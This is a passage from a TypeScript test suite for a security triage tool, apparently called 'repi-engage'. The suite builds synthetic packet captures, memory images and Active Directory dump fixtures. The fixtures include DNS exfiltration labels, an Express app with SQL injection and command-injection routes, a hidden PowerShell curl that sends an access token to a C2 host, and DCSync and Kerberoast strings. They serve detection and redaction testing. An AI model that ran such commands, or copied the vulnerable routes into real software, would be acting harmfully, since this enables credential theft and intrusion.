	const dnsAnswer = ethernetIpv4UdpFrame(dnsResponsePayload("example.com", [1, 2, 3, 4]), 53, 5353);
	const exfilLabel = "MFRGGZDFMZTWQ2LKNNWG23TPOIXW443X";
	const dnsExfil = ethernetIpv4UdpFrame(dnsQueryPayload(`${exfilLabel}.exfil.example`), 5354, 53);
	const ftp = ethernetIpv4TcpFrame(Buffer.from("USER admin\r\nPASS superSecretTokenValue\r\n"), 40000, 21);
	const objectSecret = "flag{http_body_secret_must_not_leak}";
	const transformSecret = "flag{http_transform_secret_must_not_leak}";
	const archive = minimalZip([
		{ name: "objects/flag.txt", data: objectSecret },
		{ name: "encoded/base64.txt", data: Buffer.from(transformSecret).toString("base64") },
	]);
	const objectHeader = Buffer.from(
		[
			"HTTP/1.1 200 OK",
			"Server: object-test",
			"Content-Type: application/zip",
			'Content-Disposition: attachment; filename="loot.zip"',
			`Content-Length: ${archive.length}`,
			"",
			"",
		].join("\r\n"),
		"ascii",
	);
	const objectPayload = Buffer.concat([objectHeader, archive]);
	const objectSplitAt = objectHeader.length + 24;
	const objectSeqBase = 30_000;
	return Buffer.concat([
		pcapngBlock(0x0a0d0d0a, sectionBody),
		pcapngBlock(1, idbBody),
		enhancedPacket(dns),
		enhancedPacket(dnsAnswer),
		enhancedPacket(dnsExfil),
		enhancedPacket(http),
		enhancedPacket(httpResponse),
		enhancedPacket(ftp),
		enhancedPacket(ethernetIpv4TcpFrame(objectPayload.subarray(0, objectSplitAt), 80, 50300, objectSeqBase)),
		enhancedPacket(
			ethernetIpv4TcpFrame(objectPayload.subarray(objectSplitAt), 80, 50300, objectSeqBase + objectSplitAt),
		),
	]);
}

function minimalPcapngSplitHttp(): Buffer {
	const sectionBody = Buffer.alloc(16);
	sectionBody.writeUInt32LE(0x1a2b3c4d, 0);
	sectionBody.writeUInt16LE(1, 4);
	sectionBody.writeUInt16LE(0, 6);
	sectionBody.writeInt32LE(-1, 8);
	sectionBody.writeInt32LE(-1, 12);
	const idbBody = Buffer.alloc(8);
	idbBody.writeUInt16LE(1, 0);
	idbBody.writeUInt16LE(0, 2);
	idbBody.writeUInt32LE(65535, 4);
	const enhancedPacket = (packet: Buffer) => {
		const body = Buffer.alloc(20 + packet.length);
		body.writeUInt32LE(0, 0);
		body.writeUInt32LE(0, 4);
		body.writeUInt32LE(1, 8);
		body.writeUInt32LE(packet.length, 12);
		body.writeUInt32LE(packet.length, 16);
		packet.copy(body, 20);
		return pcapngBlock(6, body);
	};
	const part1 = [
		"POST /login HTTP/1.1",
		"Host: split.local",
		"Authorization: Bearer splitSecretBearerValue",
		"Cookie: sid=splitSecretCookieValue; theme=light",
		"Content-Type: application/x-www-form-urlencoded",
		"",
		"user=alice&",
	].join("\r\n");
	const part2 = "x=1&password=splitSecretFormValue&csrf_token=splitSecretCsrfValue";
	const seqBase = 10_000;
	return Buffer.concat([
		pcapngBlock(0x0a0d0d0a, sectionBody),
		pcapngBlock(1, idbBody),
		enhancedPacket(ethernetIpv4TcpFrame(Buffer.from(part2), 50100, 80, seqBase + Buffer.byteLength(part1))),
		enhancedPacket(ethernetIpv4TcpFrame(Buffer.from(part1), 50100, 80, seqBase)),
	]);
}

function minimalPcapngTls(): Buffer {
	const sectionBody = Buffer.alloc(16);
	sectionBody.writeUInt32LE(0x1a2b3c4d, 0);
	sectionBody.writeUInt16LE(1, 4);
	sectionBody.writeUInt16LE(0, 6);
	sectionBody.writeInt32LE(-1, 8);
	sectionBody.writeInt32LE(-1, 12);
	const idbBody = Buffer.alloc(8);
	idbBody.writeUInt16LE(1, 0);
	idbBody.writeUInt16LE(0, 2);
	idbBody.writeUInt32LE(65535, 4);
	const enhancedPacket = (packet: Buffer) => {
		const body = Buffer.alloc(20 + packet.length);
		body.writeUInt32LE(0, 0);
		body.writeUInt32LE(0, 4);
		body.writeUInt32LE(1, 8);
		body.writeUInt32LE(packet.length, 12);
		body.writeUInt32LE(packet.length, 16);
		packet.copy(body, 20);
		return pcapngBlock(6, body);
	};
	const tls = ethernetIpv4TcpFrame(tlsClientHelloPayload("api.example.local"), 49152, 443);
	return Buffer.concat([pcapngBlock(0x0a0d0d0a, sectionBody), pcapngBlock(1, idbBody), enhancedPacket(tls)]);
}

describe("repi-engage artifact writes", () => {
	let tempRoot: string;
	let agentDir: string;
	let workspace: string;
	let target: string;

	beforeEach(() => {
		tempRoot = mkdtempSync(join(tmpdir(), "repi-engage-atomic-"));
		agentDir = join(tempRoot, "agent");
		workspace = join(tempRoot, "workspace");
		target = join(workspace, "sample.bin");
		mkdirSync(workspace, { recursive: true });
		writeFileSync(target, "REPI engage sample\n");
	});

	afterEach(() => {
		rmSync(tempRoot, { recursive: true, force: true });
	});

	function runEngage() {
		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, target, "--no-mission", "--json", "--timeout-ms", "5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		return JSON.parse(result.stdout) as { artifactDir: string; summary: { passed: number } };
	}

	it("rewrites latest.json by temp+rename and keeps engagement artifacts private", () => {
		const first = runEngage();
		expect(first.summary.passed).toBeGreaterThan(0);
		const latestPath = join(agentDir, "recon", "evidence", "engagements", "latest.json");
		const firstLatestInode = statSync(latestPath).ino;

		const second = runEngage();
		const secondLatestInode = statSync(latestPath).ino;
		if (firstLatestInode !== 0 && secondLatestInode !== 0) expect(secondLatestInode).not.toBe(firstLatestInode);

		for (const [name, mode] of [
			["commands.jsonl", 0o600],
			["report.json", 0o600],
			["summary.md", 0o600],
			["next-commands.sh", 0o700],
		] as const) {
			const path = join(second.artifactDir, name);
			expect(existsSync(path), `${name} exists`).toBe(true);
			expect(statSync(path).mode & 0o777, `${name} mode`).toBe(mode);
		}
		expect(JSON.parse(readFileSync(latestPath, "utf8")).artifactDir).toBe(second.artifactDir);
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("does not consume the target after boolean flags", () => {
		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, "--json", target, "--no-mission", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as { target: { redacted: string; kind: string; pathExists: boolean } };
		expect(report.target.redacted).toBe(target);
		expect(report.target.kind).toBe("file");
		expect(report.target.pathExists).toBe(true);
	});

	it("routes JS bundles and memory images into specialist engagement lanes", () => {
		const jsTarget = join(workspace, "bundle.js");
		writeFileSync(jsTarget, "function sign(x){ return crypto.subtle.digest('SHA-256', x) } fetch('/api')\n");
		const jsResult = spawnSync(
			process.execPath,
			[ENGAGE, workspace, jsTarget, "--no-mission", "--no-write", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(jsResult.status, `${jsResult.stderr}\n${jsResult.stdout}`).toBe(0);
		const jsReport = JSON.parse(jsResult.stdout) as {
			target: { lane: string };
			commands: Array<{ id: string }>;
			summary: { anchors: string[] };
		};
		expect(jsReport.target.lane).toBe("js-reverse");
		expect(jsReport.commands.map((row) => row.id)).toContain("js-pattern-search");
		expect(jsReport.summary.anchors).toContain("JS signing/runtime anchors");

		const jsWriteResult = spawnSync(
			process.execPath,
			[ENGAGE, workspace, jsTarget, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(jsWriteResult.status, `${jsWriteResult.stderr}\n${jsWriteResult.stdout}`).toBe(0);
		const jsWriteReport = JSON.parse(jsWriteResult.stdout) as {
			artifactDir: string;
			commands: Array<{ id: string; stdout: string }>;
			nextQueue: string[];
			summary: { anchors: string[] };
		};
		expect(jsWriteReport.commands.map((row) => row.id)).toContain("js-reverse-workbench");
		expect(jsWriteReport.commands.map((row) => row.id)).toContain("proof-harness-self-test");
		expect(jsWriteReport.summary.anchors).toContain("JS reverse workbench anchors");
		expect(jsWriteReport.summary.anchors).toContain("proof harness/self-test anchors");
		expect(jsWriteReport.commands.find((row) => row.id === "js-reverse-workbench")?.stdout).toContain(
			"js-signature-rebuild-candidate",
		);
		const jsWorkbenchPath = join(jsWriteReport.artifactDir, "js-reverse-workbench.json");
		const jsProofMatrixPath = join(jsWriteReport.artifactDir, "proof-matrix.json");
		expect(existsSync(jsWorkbenchPath)).toBe(true);
		expect(existsSync(jsProofMatrixPath)).toBe(true);
		const jsWorkbench = JSON.parse(readFileSync(jsWorkbenchPath, "utf8")) as {
			risks: string[];
			files: Array<{ endpoints: string[]; functionCandidates: Array<{ name: string }> }>;
		};
		expect(jsWorkbench.risks).toContain("js-signature-rebuild-candidate");
		expect(jsWorkbench.files[0].endpoints).toContain("/api");
		expect(jsWorkbench.files[0].functionCandidates.map((candidate) => candidate.name)).toContain("sign");
		const jsProofMatrix = JSON.parse(readFileSync(jsProofMatrixPath, "utf8")) as {
			artifacts: Array<{ relPath: string }>;
			liveChecks: Array<{ id: string }>;
		};
		expect(jsProofMatrix.artifacts.map((row) => row.relPath)).toContain("js-reverse-workbench.json");
		expect(jsProofMatrix.liveChecks.map((row) => row.id)).toContain("js-reverse-workbench-self-test");
		expect(jsWriteReport.nextQueue.some((command) => command.includes("js-reverse-workbench.mjs"))).toBe(true);

		const memoryTarget = join(workspace, "capture.vmem");
		writeFileSync(memoryTarget, "WinProcess cmdline token lsass http artifact\n");
		const memoryResult = spawnSync(
			process.execPath,
			[ENGAGE, workspace, memoryTarget, "--no-mission", "--no-write", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(memoryResult.status, `${memoryResult.stderr}\n${memoryResult.stdout}`).toBe(0);
		const memoryReport = JSON.parse(memoryResult.stdout) as {
			target: { lane: string };
			nextQueue: string[];
		};
		expect(memoryReport.target.lane).toBe("memory-forensics");
		expect(memoryReport.nextQueue.some((command) => command.includes("memory forensics"))).toBe(true);
	});

	it("maps workspace source routes into runtime proof targets", () => {
		const appDir = join(workspace, "source-app");
		const srcDir = join(appDir, "src");
		mkdirSync(srcDir, { recursive: true });
		writeFileSync(
			join(appDir, "package.json"),
			JSON.stringify({ scripts: { start: "node src/server.js" }, dependencies: { express: "1.0.0" } }),
		);
		writeFileSync(
			join(srcDir, "server.js"),
			[
				"const express = require('express');",
				"const child_process = require('child_process');",
				"const app = express();",
				"const requireAuth = (req,res,next)=> next();",
				"app.get('/api/account/:id', requireAuth, (req,res)=> db.query('SELECT * FROM users WHERE id=' + req.params.id));",
				"app.post('/api/admin/run', (req,res)=> child_process.exec(req.body.cmd));",
				"function signRequest(params){ return crypto.createHash('md5').update(Object.keys(params).sort().join('&') + client_secret).digest('hex') }",
			].join("\n"),
		);

		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, appDir, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);

		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			target: { kind: string; lane: string };
			commands: Array<{ id: string; stdout: string }>;
			nextQueue: string[];
			summary: { anchors: string[] };
		};
		expect(report.target.kind).toBe("directory");
		expect(report.target.lane).toBe("js-reverse");
		expect(report.commands.map((row) => row.id)).toContain("workspace-source-runtime-map");
		expect(report.commands.map((row) => row.id)).toContain("workspace-route-replay-harness-artifact");
		expect(report.commands.map((row) => row.id)).toContain("workspace-route-replay-plan");
		expect(report.commands.map((row) => row.id)).toContain("workspace-source-runtime-claims");
		expect(report.commands.map((row) => row.id)).toContain("proof-harness-self-test");
		expect(report.summary.anchors).toContain("workspace source-to-runtime anchors");
		expect(report.summary.anchors).toContain("workspace route replay/authz anchors");
		expect(report.summary.anchors).toContain("workspace source-runtime claim anchors");
		expect(report.summary.anchors).toContain("proof harness/self-test anchors");
		const mapPath = join(report.artifactDir, "workspace-source-runtime-map.json");
		const harnessPath = join(report.artifactDir, "workspace-source-runtime-harness.mjs");
		const routeReplayHarnessPath = join(report.artifactDir, "workspace-route-replay-harness.mjs");
		const routeReplayPlanPath = join(report.artifactDir, "workspace-route-replay-plan.json");
		const routeClaimPromotionPath = join(report.artifactDir, "workspace-route-claim-promotion.json");
		const routeRepairQueuePath = join(report.artifactDir, "workspace-route-repair-queue.json");
		const workspaceClaimsPath = join(report.artifactDir, "workspace-source-runtime-claims.json");
		const proofMatrixPath = join(report.artifactDir, "proof-matrix.json");
		expect(existsSync(mapPath)).toBe(true);
		expect(existsSync(harnessPath)).toBe(true);
		expect(existsSync(routeReplayHarnessPath)).toBe(true);
		expect(existsSync(routeReplayPlanPath)).toBe(true);
		expect(existsSync(routeClaimPromotionPath)).toBe(true);
		expect(existsSync(routeRepairQueuePath)).toBe(true);
		expect(existsSync(workspaceClaimsPath)).toBe(true);
		expect(existsSync(proofMatrixPath)).toBe(true);
		expect(statSync(mapPath).mode & 0o777).toBe(0o600);
		expect(statSync(harnessPath).mode & 0o777).toBe(0o700);
		expect(statSync(routeReplayHarnessPath).mode & 0o777).toBe(0o700);
		expect(statSync(routeReplayPlanPath).mode & 0o777).toBe(0o600);
		expect(statSync(routeClaimPromotionPath).mode & 0o777).toBe(0o600);
		expect(statSync(routeRepairQueuePath).mode & 0o777).toBe(0o600);
		expect(statSync(workspaceClaimsPath).mode & 0o777).toBe(0o600);
		const sourceMap = JSON.parse(readFileSync(mapPath, "utf8")) as {
			counts: { routes: number; sinks: number; proofTargets: number };
			risks: string[];
			routes: Array<{ path: string; method: string }>;
			proofTargets: Array<{ risks: string[] }>;
			routeReplayTemplates: Array<{ negativeControls: string[] }>;
			runtimeCommands: Array<{ command: string }>;
		};
		expect(sourceMap.counts.routes).toBeGreaterThanOrEqual(2);
		expect(sourceMap.counts.sinks).toBeGreaterThanOrEqual(1);
		expect(sourceMap.counts.proofTargets).toBeGreaterThanOrEqual(1);
		expect(sourceMap.risks).toContain("route-to-dangerous-sink-candidate");
		expect(sourceMap.routes).toEqual(
			expect.arrayContaining([
				expect.objectContaining({ method: "GET", path: "/api/account/:id" }),
				expect.objectContaining({ method: "POST", path: "/api/admin/run" }),
			]),
		);
		expect(sourceMap.proofTargets[0].risks.length).toBeGreaterThan(0);
		expect(sourceMap.routeReplayTemplates[0].negativeControls).toContain("repeat without Cookie/Authorization");
		expect(sourceMap.runtimeCommands.map((row) => row.command)).toContain("npm run start");
		const routeReplayPlan = JSON.parse(readFileSync(routeReplayPlanPath, "utf8")) as {
			controls: string[];
			proofExitRule: string;
			claimPromotionPath: string;
			repairQueuePath: string;
		};
		expect(routeReplayPlan.controls).toContain("tampered-object");
		expect(routeReplayPlan.proofExitRule).toContain("anonymous/session");
		expect(routeReplayPlan.claimPromotionPath).toBe(routeClaimPromotionPath);
		expect(routeReplayPlan.repairQueuePath).toBe(routeRepairQueuePath);
		const routeClaimPromotion = JSON.parse(readFileSync(routeClaimPromotionPath, "utf8")) as {
			baseUrlRequired: boolean;
			proofReady: boolean;
			claimLedger: Array<{
				verdict: string;
				blockers: string[];
				sourceBinding: { file: string; line: number; route: string; method: string; proofTargetId: string };
				evidenceBinding: { negativeControls: Record<string, boolean> };
				rerunCommand: string;
			}>;
		};
		const routeRepairQueue = JSON.parse(readFileSync(routeRepairQueuePath, "utf8")) as {
			queue: Array<{ blocker: string; sourceBinding: { route: string }; rerunCommand: string }>;
		};
		expect(routeClaimPromotion.baseUrlRequired).toBe(true);
		expect(routeClaimPromotion.proofReady).toBe(false);
		expect(routeClaimPromotion.claimLedger.length).toBeGreaterThan(0);
		expect(routeClaimPromotion.claimLedger[0].verdict).toBe("blocked");
		expect(routeClaimPromotion.claimLedger[0].blockers).toContain("missing-base-url");
		expect(routeClaimPromotion.claimLedger[0].sourceBinding.file).toBe("src/server.js");
		expect(routeClaimPromotion.claimLedger[0].evidenceBinding.negativeControls.anonymous).toBe(false);
		expect(routeClaimPromotion.claimLedger[0].rerunCommand).toContain("REPI_WORKSPACE_BASE_URL");
		expect(routeRepairQueue.queue.map((row) => row.blocker)).toContain("missing-base-url");
		const workspaceClaims = JSON.parse(readFileSync(workspaceClaimsPath, "utf8")) as {
			proofReady: boolean;
			runtimeProofReady: boolean;
			exploitProofReady: boolean;
			claimLedger: Array<{ claimType: string; verdict: string; blockers: string[] }>;
			composedPaths: Array<{ claimType: string }>;
			promotionReport: { blockers: string[] };
			repairQueue: Array<{ blocker: string }>;
		};
		expect(workspaceClaims.proofReady).toBe(true);
		expect(workspaceClaims.runtimeProofReady).toBe(false);
		expect(workspaceClaims.exploitProofReady).toBe(false);
		expect(workspaceClaims.claimLedger.map((claim) => claim.claimType)).toContain(
			"workspace-route-dangerous-sink-surface",
		);
		expect(workspaceClaims.claimLedger.map((claim) => claim.claimType)).toContain(
			"workspace-state-changing-route-surface",
		);
		expect(workspaceClaims.claimLedger.map((claim) => claim.claimType)).toContain(
			"workspace-runtime-replay-plan-blocked",
		);
		expect(workspaceClaims.composedPaths.length).toBe(0);
		expect(workspaceClaims.promotionReport.blockers).toContain("missing-base-url");
		expect(workspaceClaims.repairQueue.map((row) => row.blocker)).toContain("missing-base-url");
		const proofMatrix = JSON.parse(readFileSync(proofMatrixPath, "utf8")) as {
			artifacts: Array<{ relPath: string }>;
			liveChecks: Array<{ id: string }>;
		};
		expect(proofMatrix.artifacts.map((row) => row.relPath)).toContain("workspace-source-runtime-map.json");
		expect(proofMatrix.artifacts.map((row) => row.relPath)).toContain("workspace-route-replay-harness.mjs");
		expect(proofMatrix.artifacts.map((row) => row.relPath)).toContain("workspace-route-claim-promotion.json");
		expect(proofMatrix.artifacts.map((row) => row.relPath)).toContain("workspace-route-repair-queue.json");
		expect(proofMatrix.artifacts.map((row) => row.relPath)).toContain("workspace-source-runtime-claims.json");
		expect(proofMatrix.liveChecks.map((row) => row.id)).toContain("workspace-source-runtime-harness-self-test");
		expect(proofMatrix.liveChecks.map((row) => row.id)).toContain("workspace-route-replay-harness-self-test");
		expect(
			report.nextQueue.some(
				(command) => command.includes("workspace-source-runtime-harness.mjs") && command.includes(appDir),
			),
		).toBe(true);
		expect(
			report.nextQueue.some(
				(command) => command.includes("workspace-route-replay-harness.mjs") && command.includes("--live"),
			),
		).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("workspace-route-claim-promotion.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("workspace-route-repair-queue.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("workspace-source-runtime-claims.json"))).toBe(true);
		expect(
			report.nextQueue.some((command) => command.includes("claimLedger") && command.includes("composedPaths")),
		).toBe(true);
		const routeReplaySelfTest = spawnSync(process.execPath, [routeReplayHarnessPath, "--self-test"], {
			encoding: "utf8",
			timeout: 15_000,
		});
		expect(routeReplaySelfTest.status, `${routeReplaySelfTest.stderr}\n${routeReplaySelfTest.stdout}`).toBe(0);
		const selfTestReport = JSON.parse(routeReplaySelfTest.stdout) as {
			proofReady: boolean;
			promotionReport: {
				promotedClaims: Array<{
					sourceBinding: { file: string };
					evidenceBinding: { negativeControls: Record<string, boolean> };
				}>;
			};
			claimLedger: Array<{
				verdict: string;
				blockers: string[];
				sourceBinding: { file: string };
				evidenceBinding: { variants: Array<{ control: string; responseSha256: string }> };
			}>;
			repairQueue: unknown[];
			rows: Array<{ variants: Array<{ control: string }> }>;
		};
		expect(selfTestReport.proofReady).toBe(true);
		expect(selfTestReport.promotionReport.promotedClaims.length).toBeGreaterThan(0);
		expect(selfTestReport.claimLedger.some((claim) => claim.verdict === "promoted")).toBe(true);
		expect(selfTestReport.claimLedger[0].sourceBinding.file).toBe("src/server.js");
		expect(selfTestReport.claimLedger[0].evidenceBinding.variants.map((row) => row.control)).toContain("anonymous");
		expect(selfTestReport.claimLedger[0].evidenceBinding.variants.map((row) => row.control)).toContain("session");
		expect(selfTestReport.claimLedger[0].evidenceBinding.variants[0].responseSha256).toMatch(/^[a-f0-9]{64}$/);
		expect(selfTestReport.promotionReport.promotedClaims[0].evidenceBinding.negativeControls.anonymous).toBe(true);
		expect(selfTestReport.promotionReport.promotedClaims[0].evidenceBinding.negativeControls.session).toBe(true);
		expect(selfTestReport.repairQueue.length).toBe(0);
		expect(selfTestReport.rows[0].variants.map((row) => row.control)).toContain("anonymous");
		expect(selfTestReport.rows[0].variants.map((row) => row.control)).toContain("session");
	});

	it("summarizes memory images and emits triage plans without requiring volatility", () => {
		const memoryTarget = join(workspace, "incident.vmem");
		const secret = "superMemorySecretToken123456789";
		writeFileSync(
			memoryTarget,
			[
				"Windows 10 Pro build 19045",
				"Process lsass.exe pid=500",
				`powershell.exe -nop -w hidden curl http://10.0.0.5:8080/c2?access_token=${secret}`,
				`Authorization: Bearer ${secret}`,
				`password=${secret}`,
				"C:\\Users\\alice\\AppData\\Roaming\\payload.exe",
				"/etc/passwd",
				"2026-07-01 10:20:30",
			].join("\0"),
		);
		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, memoryTarget, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			target: { lane: string };
			commands: Array<{ id: string; stdout: string }>;
			nextQueue: string[];
			summary: { anchors: string[]; missingCritical: string[] };
		};
		expect(JSON.stringify(report)).not.toContain(secret);
		expect(report.target.lane).toBe("memory-forensics");
		expect(report.commands.map((row) => row.id)).toContain("memory-quicklook");
		expect(report.commands.map((row) => row.id)).toContain("memory-evidence-claims");
		expect(report.commands.map((row) => row.id)).toContain("memory-triage-plan-artifact");
		expect(report.summary.missingCritical).not.toContain("strings");
		expect(report.summary.anchors).toContain("memory quicklook anchors");
		expect(report.summary.anchors).toContain("memory correlation anchors");
		expect(report.nextQueue.some((command) => command.includes("memory-quicklook.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("memory-evidence-claims.json"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("claimLedger"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("memory-triage-plan.sh"))).toBe(true);
		expect(report.nextQueue.some((command) => command.includes("correlations"))).toBe(true);
		const summaryPath = join(report.artifactDir, "memory-quicklook.json");
		const evidenceClaimsPath = join(report.artifactDir, "memory-evidence-claims.json");
		const planPath = join(report.artifactDir, "memory-triage-plan.sh");
		expect(existsSync(summaryPath)).toBe(true);
		expect(existsSync(evidenceClaimsPath)).toBe(true);
		expect(existsSync(planPath)).toBe(true);
		expect(statSync(summaryPath).mode & 0o777).toBe(0o600);
		expect(statSync(evidenceClaimsPath).mode & 0o777).toBe(0o600);
		expect(statSync(planPath).mode & 0o777).toBe(0o700);
		const summary = JSON.parse(readFileSync(summaryPath, "utf8")) as {
			osGuess: string;
			stringScan: {
				signals: {
					osHints: Array<{ text: string }>;
					processes: Array<{ text: string }>;
					cmdlines: Array<{ text: string }>;
					network: Array<{ text: string }>;
					credentials: Array<{ text: string }>;
					files: Array<{ text: string }>;
					timestamps: Array<{ text: string }>;
				};
			};
			correlations: {
				processNetwork: Array<{ process: string; cmdline: { text: string }; network: { text: string } }>;
				credentialContext: Array<{
					credential: { text: string };
					cmdline: { text: string } | null;
					network: { text: string } | null;
					file: { text: string } | null;
				}>;
				timeline: Array<{ timestamp: { text: string }; cmdline: { text: string } | null }>;
			};
			risks: string[];
		};
		expect(JSON.stringify(summary)).not.toContain(secret);
		const evidenceClaims = JSON.parse(readFileSync(evidenceClaimsPath, "utf8")) as {
			proofReady: boolean;
			claimLedger: Array<{ claimType: string; verdict: string; evidenceBinding: Record<string, unknown> }>;
			composedPaths: Array<{ claimType: string; verdict: string }>;
			promotionReport: { promotedClaims: Array<{ claimType: string }> };
			repairQueue: Array<{ blocker: string }>;
		};
		expect(JSON.stringify(evidenceClaims)).not.toContain(secret);
		expect(evidenceClaims.proofReady).toBe(true);
		expect(
			evidenceClaims.claimLedger.some(
				(claim) => claim.claimType === "memory-process-network-correlation" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			evidenceClaims.claimLedger.some(
				(claim) => claim.claimType === "memory-credential-context" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			evidenceClaims.claimLedger.some(
				(claim) => claim.claimType === "memory-timeline-correlation" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			evidenceClaims.claimLedger.some(
				(claim) => claim.claimType === "memory-credential-network-pivot" && claim.verdict === "promoted",
			),
		).toBe(true);
		expect(
			evidenceClaims.promotionReport.promotedClaims.some(
				(claim) => claim.claimType === "memory-credential-network-pivot",
			),
		).toBe(true);
		expect(summary.osGuess).toBe("windows");
		expect(summary.risks).toEqual(
			expect.arrayContaining([
				"credential-string-signal",
				"network-artifact-signal",
				"suspicious-commandline-signal",
				"high-value-process-signal",
				"user-or-credential-file-signal",
				"process-network-correlation-signal",
				"credential-context-correlation-signal",
				"timeline-correlation-signal",
			]),
		);
		expect(summary.stringScan.signals.processes.some((row) => row.text.includes("lsass.exe"))).toBe(true);
		expect(summary.stringScan.signals.cmdlines.some((row) => row.text.includes("powershell.exe"))).toBe(true);
		expect(summary.stringScan.signals.network.some((row) => row.text.includes("access_token=<redacted>"))).toBe(true);
		expect(summary.stringScan.signals.credentials.some((row) => row.text.includes("<redacted>"))).toBe(true);
		expect(summary.stringScan.signals.files.some((row) => row.text.includes("C:\\Users\\alice"))).toBe(true);
		expect(summary.stringScan.signals.timestamps.some((row) => row.text.includes("2026-07-01"))).toBe(true);
		expect(summary.correlations.processNetwork[0]).toMatchObject({ process: "powershell.exe" });
		expect(summary.correlations.processNetwork[0].network.text).toContain("access_token=<redacted>");
		expect(
			summary.correlations.credentialContext.some(
				(row) => row.credential.text.includes("<redacted>") && row.network,
			),
		).toBe(true);
		expect(summary.correlations.timeline.some((row) => row.timestamp.text.includes("2026-07-01"))).toBe(true);
		const plan = readFileSync(planPath, "utf8");
		expect(plan).toContain("windows.pslist");
		expect(plan).toContain("strings -a -n 5");
		expect(plan).toContain("high-signal.txt");
		const proofMatrixPath = join(report.artifactDir, "proof-matrix.json");
		expect(existsSync(proofMatrixPath)).toBe(true);
		const proofMatrix = JSON.parse(readFileSync(proofMatrixPath, "utf8")) as {
			artifacts: Array<{ relPath: string }>;
		};
		expect(proofMatrix.artifacts.map((row) => row.relPath)).toContain("memory-evidence-claims.json");
		expect(collectTmp(agentDir)).toEqual([]);
	});

	it("summarizes Windows/AD identity artifacts and emits triage plans", () => {
		const adWorkspace = join(workspace, "ad-dump");
		mkdirSync(join(adWorkspace, "bloodhound"), { recursive: true });
		const secret = "superAdSecretToken123456789";
		writeFileSync(
			join(adWorkspace, "ntds.dit"),
			[
				"NTDS.DIT domain CORP.EXAMPLE.COM",
				"krbtgt CORP\\krbtgt NTLM hash aad3b435b51404eeaad3b435b51404ee",
				"DCSync secretsdump.py -just-dc-user CORP\\Administrator",
				"SPN MSSQLSvc/sql01.corp.example.com:1433 Kerberoast 4769",
			].join("\0"),
		);
		writeFileSync(join(adWorkspace, "SYSTEM"), "SYSTEM hive bootkey material\n");
		writeFileSync(
			join(adWorkspace, "Security.evtx"),
			Buffer.concat([
				Buffer.from("ElfFile\0"),
				Buffer.from("EventID 4624 Logon CORP\\alice 2026-07-01T11:00:00Z\nEventID 4672 Special privileges\n"),
			]),
		);
		writeFileSync(join(adWorkspace, "ticket.kirbi"), "KRB5 kirbi TGT CORP\\alice@CORP.EXAMPLE.COM\n");
		writeFileSync(
			join(adWorkspace, "bloodhound", "users.json"),
			JSON.stringify({
				data: [
					{
						name: "ALICE@CORP.EXAMPLE.COM",
						objectid: "S-1-5-21-1-2-3-1101",
						owned: true,
						memberOf: "Domain Admins",
						description: `token="${secret}" ADCS ESC1 Certipy BloodHound SharpHound`,
					},
				],
			}),
		);
		writeFileSync(
			join(adWorkspace, "bloodhound", "edges.json"),
			JSON.stringify({
				edges: [
					{
						StartNode: "ALICE@CORP.EXAMPLE.COM",
						EndNode: "DOMAIN ADMINS@CORP.EXAMPLE.COM",
						RelationshipType: "MemberOf",
					},
					{
						StartNode: "ALICE@CORP.EXAMPLE.COM",
						EndNode: "DC01.CORP.EXAMPLE.COM",
						RelationshipType: "GenericAll",
					},
				],
				nodes: [
					{
						Name: "DOMAIN ADMINS@CORP.EXAMPLE.COM",
						ObjectType: "Group",
						HighValue: true,
					},
					{
						Name: "DC01.CORP.EXAMPLE.COM",
						ObjectType: "Computer",
						HighValue: true,
					},
				],
			}),
		);
		const result = spawnSync(
			process.execPath,
			[ENGAGE, workspace, adWorkspace, "--no-mission", "--json", "--timeout-ms=5000"],
			{
				encoding: "utf8",
				env: {
					...process.env,
					REPI_CODING_AGENT_DIR: agentDir,
				},
				timeout: 15_000,
			},
		);
		expect(result.status, `${result.stderr}\n${result.stdout}`).toBe(0);
		const report = JSON.parse(result.stdout) as {
			artifactDir: string;
			target: { lane: string; representativePath: string };
			commands: Array<{ id: string; stdout: string }>;
			nextQueue: string[];
			summary: { anchors: string[]; missingCritical: string[] };
		};
		expect(JSON.stringify(report)).not.toContain(secret);
		expect(report.target.lane).toBe("windows-ad");
